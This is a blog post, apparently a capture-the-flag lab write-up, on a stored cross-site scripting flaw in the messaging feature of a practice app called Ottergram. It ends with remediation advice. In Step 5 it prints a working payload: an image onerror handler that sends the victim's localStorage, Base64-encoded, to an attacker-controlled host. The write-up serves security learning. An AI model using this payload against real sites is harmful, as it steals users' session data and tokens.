---
layout: post
title:  "BugForge - Daily - Ottergram"
date:   2026-01-24 20:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [xss,oob]
categories: [BugForge,daily,ottergram]
---

# Daily - Ottergram
><br/><b>Vulnerabilities Covered:</b>
<br/>
Cross-Site Scripting (XSS) - Out-of-Band (OOB) Data Exfiltration
<br/>
<br/>
<b>Summary:</b>
<br/>
A stored **`Cross-Site Scripting (XSS)`** vulnerability was identified in the messaging functionality where user input is rendered using React's `dangerouslySetInnerHTML` without proper server-side sanitization. While the frontend applies input sanitization, this can be bypassed by intercepting and modifying requests before they reach the server. By injecting a malicious payload into a message, an attacker can execute arbitrary JavaScript in the context of another user's browser session. This was exploited using **`Out-of-Band (OOB) data exfiltration`** to retrieve the victim's localStorage contents, including sensitive session data, by sending it to an attacker-controlled server via an injected image tag with an error handler.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Account Registration
Register two separate user accounts to facilitate testing. Having multiple accounts allows for simulating attacker-victim scenarios and validating that injected payloads execute in the context of another user's session.

---

### Step 2 - Source Code Analysis
Analyze the application's JavaScript source code to identify potential injection points. In `message.js`, observe that the application uses React's `dangerouslySetInnerHTML` to render message content. This method bypasses React's built-in XSS protections and renders raw HTML, making it vulnerable to script injection if input is not properly sanitized on the server side.

![Code analysis](/images/bug-forge/daily/ottergram/xss/code-analysis.png)

---

### Step 3 - Intercept and Analyze Message Requests
Send a test message and intercept the request using a proxy tool. Observe that input sanitization is performed on the frontend before the request is sent. This client-side sanitization can be bypassed by modifying the request payload directly, as the backend may trust that the frontend has already sanitized the input.

![Front-end Sanitisation](/images/bug-forge/daily/ottergram/xss/front-end-sanitised-html.png)

---

### Step 4 - Out-of-Band XSS Validation
To confirm the XSS vulnerability without requiring direct observation of the victim's browser, submit an Out-of-Band (OOB) payload using Caido's QuickSSRF or a similar callback service. This technique triggers an external request when the payload executes, providing confirmation that arbitrary JavaScript runs in the victim's browser context.

![XSS OOB - Payload](/images/bug-forge/daily/ottergram/xss/xxs-callback-payload.png)

![XSS OOB - Received](/images/bug-forge/daily/ottergram/xss/xss-callback-received.png)

---

### Step 5 - Data Exfiltration via localStorage
With XSS execution confirmed, craft a payload to exfiltrate the victim's localStorage contents. The payload uses an image tag with an invalid source, triggering the `onerror` event handler to execute JavaScript:

```html
<img src=x onerror="fetch('https://attacker.oast.site/?payload='+btoa(JSON.stringify(localStorage)))">
```

This payload converts the localStorage object to a JSON string using `JSON.stringify()`, encodes it as Base64 using `btoa()`, and appends it as a query parameter to a request sent to the attacker-controlled server.

![Final Payload](/images/bug-forge/daily/ottergram/xss/final-payload.png)

Decode the exfiltrated Base64 string using CyberChef or a similar tool to reveal the stolen localStorage contents, including the challenge flag.

![Flag](/images/bug-forge/daily/ottergram/xss/flag.png)

---

### Impact
- Arbitrary JavaScript execution in victim's browser session
- Exfiltration of sensitive data including localStorage and sessionStorage contents
- Potential session hijacking through stolen authentication tokens
- Ability to perform actions on behalf of the victim user
- Complete compromise of client-side security controls

---

### Vulnerability Classification
- **OWASP Top 10:** Injection (Cross-Site Scripting)
- **Vulnerability Type:** Stored XSS with Out-of-Band Data Exfiltration
- **Attack Surface:** Messaging functionality with unsanitized HTML rendering
- **CWE:** CWE-79 - Improper Neutralization of Input During Web Page Generation

---

### Root Cause
The application uses `dangerouslySetInnerHTML` to render user-controlled message content without implementing server-side input sanitization. The backend trusts that the frontend has sanitized user input, but this client-side validation can be bypassed by intercepting and modifying HTTP requests directly. This violates the security principle of never trusting client-side input validation.

---

### Remediation
- Implement strict server-side input sanitization for all user-controlled content before storage
- Use a proven HTML sanitization library such as DOMPurify on both client and server
- Avoid using `dangerouslySetInnerHTML` unless absolutely necessary, and only with thoroughly sanitized content
- Implement Content Security Policy (CSP) headers to restrict script execution and prevent exfiltration to unauthorized domains
- Apply HttpOnly and Secure flags to sensitive cookies to limit the impact of XSS attacks
- Consider using a Content Security Policy with strict `connect-src` directives to prevent unauthorized outbound requests

---